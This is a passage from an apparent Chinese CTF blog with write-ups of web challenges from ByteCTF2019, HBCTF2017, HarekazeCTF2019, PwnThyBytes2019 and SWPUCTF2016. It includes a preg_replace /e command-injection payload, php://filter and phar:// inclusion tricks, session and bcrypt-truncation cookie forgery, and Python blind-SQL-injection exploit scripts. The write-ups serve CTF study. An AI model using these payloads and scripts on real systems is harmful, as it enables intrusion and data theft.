<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = addslashes(preg_replace(<span class="string">"/"</span> . $_POST[<span class="string">'find'</span>] . <span class="string">"/"</span>, $_POST[<span class="string">'replace'</span>], $row[<span class="string">'content'</span>]));</span><br></pre></td></tr></table></figure>

<p>由于php版本较低，这里可以使用\x00截断以及e修饰符来执行命令。即<code>find=.*/e\x00</code>，<code>replace=phpinfo();</code>。之后通过error_log进行disable_function绕过，利用该项目的脚本与.so文件：<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD。只需要简单修改项目里php文件的内容里的mail函数改为error_log即可，最后用perl来获取flag。" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD。只需要简单修改项目里php文件的内容里的mail函数改为error_log即可，最后用perl来获取flag。</a></p>
<h2 id="HBCTF2017-大美西安"><a href="#HBCTF2017-大美西安" class="headerlink" title="HBCTF2017 大美西安"></a>HBCTF2017 大美西安</h2><p>下载文件处存在sql注入，可以用双写绕过关键字过滤，从而读取任意文件</p>
<p><img src="/2020/02/17/ByteCTF2019%E4%B8%8EHBCTF2017%E4%B8%A4%E9%81%93web%E9%A2%98%E8%A7%A3/1.png" alt="1"></p>
<p>index.php里可以看到文件包含处存在过滤：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file  = <span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])?$_GET[<span class="string">'file'</span>]:<span class="string">"home"</span>;</span><br><span class="line"><span class="comment">// echo $file;</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\.\.|^[\s]*\/|^[\s]*php:|filter/i'</span>,$file))&#123;</span><br><span class="line">	   <span class="keyword">echo</span> <span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">		&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;Attack Detected!&lt;/div&gt;"</span>;</span><br><span class="line">		<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以想到上传一个zip文件利用phar://协议来包含shell。在upload.php里有：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($fileTypeCheck)&#123;</span><br><span class="line">        </span><br><span class="line">        $fileOldName = addslashes(pathinfo($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>],PATHINFO_FILENAME));</span><br><span class="line">        $fileNewName = <span class="string">'./Up10aDs/'</span> . random_str() .<span class="string">'.'</span>.pathinfo($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>],PATHINFO_EXTENSION);</span><br><span class="line">        $userid = $_SESSION[<span class="string">'userid'</span>];</span><br><span class="line">        $sql= <span class="string">"insert into `download` (`uid`,`image_name`,`location`) values ($userid,'$fileOldName','$fileNewName')"</span>;</span><br><span class="line">        $res = $conn -&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($res&amp;&amp;move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $fileNewName))&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('file upload success!');window.location.href='index.php?file=home'&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('file upload error')&lt;/script&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('file  type error');&lt;/script&gt;"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>文件名会被放入数据库中，但文件会被重命名为32位的随机字符串。可以通过以下payload来盲注出文件名 <code>8 anandd location lilikeke 0x2e2f557031306144732f{}25</code>，8是上传的zip文件的序号。贴下脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">r = requests.Session()</span><br><span class="line">url = <span class="string">"http://4fda2094-0c96-407e-a3af-a94cb9026ffe.node3.buuoj.cn/downfile.php"</span></span><br><span class="line">location = <span class="string">"./Up10aDs/hgpf1g3ymgxe44antdi"</span></span><br><span class="line">payload = <span class="string">"8 anandd location lilikeke 0x2e2f557031306144732f&#123;&#125;25"</span></span><br><span class="line">hex_str = <span class="string">""</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"image"</span> : <span class="string">""</span>,</span><br><span class="line">    <span class="string">"image_download"</span>:<span class="string">"%E6%94%B6%E8%97%8F"</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">"PHPSESSID"</span> : <span class="string">"47tua03gs083tv8roe3ombspq2"</span></span><br><span class="line">&#125;</span><br><span class="line">chars = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz."</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xff</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        h = hex(ord(j))[<span class="number">2</span>:]</span><br><span class="line">        data[<span class="string">"image"</span>] = payload.format(hex_str + h)</span><br><span class="line">        res = r.post(url,data=data, cookies=cookies)</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"picture can't be"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hex_str += h</span><br><span class="line">            location += j</span><br><span class="line">            print(<span class="string">"[+]"</span> + location)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/12/05/HarekazeCTF2019-Web-writeup/">HarekazeCTF2019的几道web记录</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-12-05</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><p>题目环境：<a href="https://github.com/TeamHarekaze/HarekazeCTF2019-challenges" target="_blank" rel="noopener">https://github.com/TeamHarekaze/HarekazeCTF2019-challenges</a></p>
<h2 id="Encode-amp-Encode"><a href="#Encode-amp-Encode" class="headerlink" title="Encode &amp; Encode"></a>Encode &amp; Encode</h2><p>题目给了源代码，关键部分如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">'page'</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$content = preg_replace(<span class="string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">'content'</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>

<p>is_valid函数会检测php，file，flag等等关键词。这里先对POST的json数据进行检测，再对读取的文件内容进行检测。由于json，可以使用形如’\u00xx’这样的unicode编码对ascii字符进行转义，所以对第一个检测我们可以使用unicode进行绕过；第二重检测会检测文件的内容，但是由于我们可以通过unicode编码绕过了对于php://filter的限制，所以我们可以读取php://filter流base64编码后的文件来绕过第二重检测。</p>
<p>payload如下:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"page"</span>:<span class="string">"\u0070hp://filter/convert.base64-encode/resource=/\u0066lag"</span>&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Easy-Notes"><a href="#Easy-Notes" class="headerlink" title="Easy Notes"></a>Easy Notes</h2><p>比赛时这道题的源代码作为附件提供。在flag.php里可以看到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">          <span class="keyword">if</span> (is_admin()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! The flag is: &lt;code&gt;"</span> . getenv(<span class="string">'FLAG'</span>) . <span class="string">"&lt;/code&gt;"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>想获得flag必须是管理员。而网站为普通用户提供了一个无需注册的登录功能。登录之后可以添加笔记或者把笔记压缩并导出。</p>
<p>在用于导出压缩包的export.php处可以看到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$filename = get_user() . <span class="string">'-'</span> . bin2hex(random_bytes(<span class="number">8</span>)) . <span class="string">'.'</span> . $type;</span><br><span class="line">$filename = str_replace(<span class="string">'..'</span>, <span class="string">''</span>, $filename); <span class="comment">// avoid path traversal</span></span><br><span class="line">$path = TEMP_DIR . <span class="string">'/'</span> . $filename;</span><br><span class="line"><span class="keyword">if</span> ($type === <span class="string">'tar'</span>) &#123;</span><br><span class="line">  $archive = <span class="keyword">new</span> PharData($path);</span><br><span class="line">  $archive-&gt;startBuffering();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// use zip as default</span></span><br><span class="line">  $archive = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">  $archive-&gt;open($path, ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Disposition: attachment; filename="'</span> . $filename . <span class="string">'";'</span>);</span><br><span class="line">header(<span class="string">'Content-Length: '</span> . filesize($path));</span><br><span class="line">header(<span class="string">'Content-Type: application/zip'</span>);</span><br></pre></td></tr></table></figure>

<p>从以上代码可知，文件名由用户名+’-‘+随机字符串+后缀组成。在之后的压缩过程中并未对type进行严格校验，只要type不为tar就会被视为zip。如果我们的type是.，那么文件名的末尾的两个点会被过滤掉。可以看到这个生成的文件在用户下载后不会被删除，并且用户在下载时可以获得文件名。单纯知道这些并不能帮助我们获得flag，但是注意到init.php里有这样的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session_save_path(TEMP_DIR);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>

<p>可以看到session的存储路径与压缩文件相同。对于PHP而言，session保存在文件中，而文件名的格式是sess_xxxxx，xxxxx就是用户的PHPSESSID，且只能包含字母数字和’-‘。session中的数据以序列化的形式保存，默认情况下序列化处理器是php，即对应php.ini中的<code>session.serialize_handler = php</code>。我们可以把用户名取为sess_，type为’.’，就可以在session目录下生成一个与session文件文件名格式相同的文件。由于文件是zip格式，只有文件名能出现在zip的文件内容里，所以我们的note的title的内容为<code>|N;admin|b:1;</code>，在这段内容前的字符会被解析为上一个元素的key，使得admin|b:1;能成功解析。由于下载功能可以看到文件名，所以我们只要修改PHPSESSID为sess_之后的字符串就会被判定为admin，从而获得flag。</p>
<h2 id="Avatar-Uploader-2"><a href="#Avatar-Uploader-2" class="headerlink" title="Avatar Uploader 2"></a>Avatar Uploader 2</h2><p>在index.php里发现一个潜在的文件包含点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>($session-&gt;get(<span class="string">'theme'</span>, <span class="string">'light'</span>) . <span class="string">'.css'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>强制加在后边的.css后缀可以利用zip://或phar://进行绕过。而key函数定义如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $defaultValue = null)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;isset($key)) &#123;</span><br><span class="line">    <span class="keyword">return</span> $defaultValue;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们需要寻找一个控制data[$key]的方法。在session.php里可以看到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cookieName = <span class="string">'session'</span>, $secret = <span class="string">'secret'</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;data = [];</span><br><span class="line">  <span class="keyword">$this</span>-&gt;secret = $secret;</span><br><span class="line">  <span class="keyword">if</span> (array_key_exists($cookieName, $_COOKIE)) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">list</span>($data, $signature) = explode(<span class="string">'.'</span>, $_COOKIE[$cookieName]);</span><br><span class="line">      $data = urlsafe_base64_decode($data);</span><br><span class="line">      $signature = urlsafe_base64_decode($signature);</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;verify($data, $signature)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = json_decode($data, <span class="keyword">true</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;cookieName = $cookieName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到用户的cookie由base64编码过的json形式的data与signature组成，并且只有当签名通过了验证时才会用这个data来初始化。签名的验证与生成代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">verify</span><span class="params">($string, $signature)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> password_verify(<span class="keyword">$this</span>-&gt;secret . $string, $signature);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sign</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> password_hash(<span class="keyword">$this</span>-&gt;secret . $string, PASSWORD_BCRYPT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>secret无从得知，但是PHP手册中对于password_hash有以下描述</p>
<blockquote>
<p>使用<strong><code>PASSWORD_BCRYPT</code></strong> 做算法，将使 <code>password</code> 参数最长为72个字符，超过会被截断。</p>
</blockquote>
<p>如果生成签名时的$this-&gt;secret . $string的长度超过了72个字符，那么在这个之后填任何数据都不会改变生成的签名，所以我们只要获得一组长度超过了72的数据和其对应的签名就可以利用index.php里的文件包含。在upload.php里有：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$session-&gt;set(<span class="string">'avatar'</span>, $filename);</span><br><span class="line">flash(<span class="string">'info'</span>, <span class="string">'Your avatar has been successfully updated!'</span>);</span><br></pre></td></tr></table></figure>

<p>在上传成功后$session会加入info以及这段固定的内容。此时的data的长度已经超过了72（并且前边还有secret）。保持cookie中的签名部分不变，在json格式data后边插入’theme’:’phar://uploads/xxx.jpg/2’，其中xxx.jpg是一个压缩有2.css的zip文件，而2.css的内容是我们的webshell。这样就可以成功执行文件包含。</p>
<p>至于上传部分对于文件内容的检测这里就不再赘述，都是国内比赛考过好几次的东西</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/11/29/PwnThyBytes2019%E4%B8%8ESWPUCTF2016%E4%B8%A4%E9%81%93sql%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/">PwnThyBytes2019与SWPUCTF2016两道sql注入题目记录</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-29</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><h2 id="PwnThyBytes-2019-Baby-sql-is-not-baby-anymore"><a href="#PwnThyBytes-2019-Baby-sql-is-not-baby-anymore" class="headerlink" title="PwnThyBytes 2019  Baby sql is not baby anymore"></a>PwnThyBytes 2019  Baby sql is not baby anymore</h2><h4 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h4><p>网站实现了基本的注册登录登出等功能。在网站前端代码里提示了源码在source.zip，可以看到网站的全部源码。</p>
<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">foreach</span> ($_SESSION <span class="keyword">as</span> $key =&gt; $value): $_SESSION[$key] = filter($value); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value): $_GET[$key] = filter($value); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value): $_POST[$key] = filter($value); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($_REQUEST <span class="keyword">as</span> $key =&gt; $value): $_REQUEST[$key] = filter($value); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    !is_string($value) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">"Hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addslashes($value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]) <span class="keyword">AND</span> $_GET[<span class="string">'p'</span>] === <span class="string">"register"</span> <span class="keyword">AND</span> $_SERVER[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">'POST'</span> <span class="keyword">AND</span> <span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">AND</span> <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) <span class="keyword">AND</span> @<span class="keyword">include</span>(<span class="string">'templates/register.php'</span>);</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]) <span class="keyword">AND</span> $_GET[<span class="string">'p'</span>] === <span class="string">"login"</span> <span class="keyword">AND</span> $_SERVER[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">'GET'</span> <span class="keyword">AND</span> <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) <span class="keyword">AND</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]) <span class="keyword">AND</span> @<span class="keyword">include</span>(<span class="string">'templates/login.php'</span>);</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]) <span class="keyword">AND</span> $_GET[<span class="string">'p'</span>] === <span class="string">"home"</span> <span class="keyword">AND</span> @<span class="keyword">include</span>(<span class="string">'templates/home.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在index.php里，可以看到网站对于所有的输入都有addslashes()的过滤，并通过p参数包含templates目录下的对应文件。而所有在templates目录下的文件中都包含这样的内容：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">!<span class="keyword">isset</span>($_SESSION) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">"Direct access on this script is not allowed!"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'db.php'</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到必须有$_SESSION才能访问这些文件，而session_start()只存在于index.php中。此时的思路自然是寻找templates目录下是否存在可控变量在拼接时不被引号包裹的sql语句，然而并没有这样的语句。</p>
<h4 id="session-upload-progress绕过"><a href="#session-upload-progress绕过" class="headerlink" title="session.upload_progress绕过"></a>session.upload_progress绕过</h4><p>PHP手册里有这样的描述：</p>
<blockquote>
<p>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p>
<p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix与 session.upload_progress.name连接在一起的值</p>
</blockquote>
<p>session.upload_progress.enabled INI选项默认开启，所以我们可以通过同时POST一个与session.upload_progress.name同名的变量的方式生成$_SESSION来绕过templates里的文件的检测，而templates里的文件对于输入毫无过滤，直接通过布尔盲注就可以获得flag。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">rq = requests.Session()</span><br><span class="line">url = <span class="string">'http://13c5f1df-42e6-43a3-9cdf-3a11d9082cb4.node3.buuoj.cn/'</span></span><br><span class="line">data = <span class="string">'''-----------------------------41184676334\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\nContent-Type: text/plain\n\nfasdfdasgas\n\n-----------------------------41184676334--'''</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span> : <span class="string">'PHPSESSID=ae48b956cc319cc7c33326c62fab5c1f'</span>,</span><br><span class="line">   <span class="string">'Content-Type'</span>:<span class="string">'multipart/form-data; boundary=---------------------------41184676334'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">      payload = <span class="string">"templates/login.php?username=1\" or if(ascii(substr((select group_concat(secret) from flag_tbl),&#123;1&#125;,1))=&#123;0&#125;,1,0)%23&amp;password=fasf"</span>.format(i,x);</span><br><span class="line">      r = rq.post(url+payload,headers=headers,data=data)</span><br><span class="line">      sleep(<span class="number">0.1</span>)</span><br><span class="line">      <span class="keyword">if</span> <span class="string">"Try again!"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">         result += chr(i)</span><br><span class="line">         print(result)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<h2 id="SWPUCTF2016-web400"><a href="#SWPUCTF2016-web400" class="headerlink" title="SWPUCTF2016 web400"></a>SWPUCTF2016 web400</h2><h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">Array</span>(<span class="string">"_POST"</span>, <span class="string">"_GET"</span>, <span class="string">"_COOKIE"</span>) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$key <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($v)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"hello,hacker!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $k[<span class="number">0</span>] != <span class="string">'_'</span> ? $$k = addslashes($v) : $$k = <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在common.php里对所有的输入进行了过滤处理并且进行了变量覆盖。在riji.php里发现了没有被引号包裹的注入点</p>
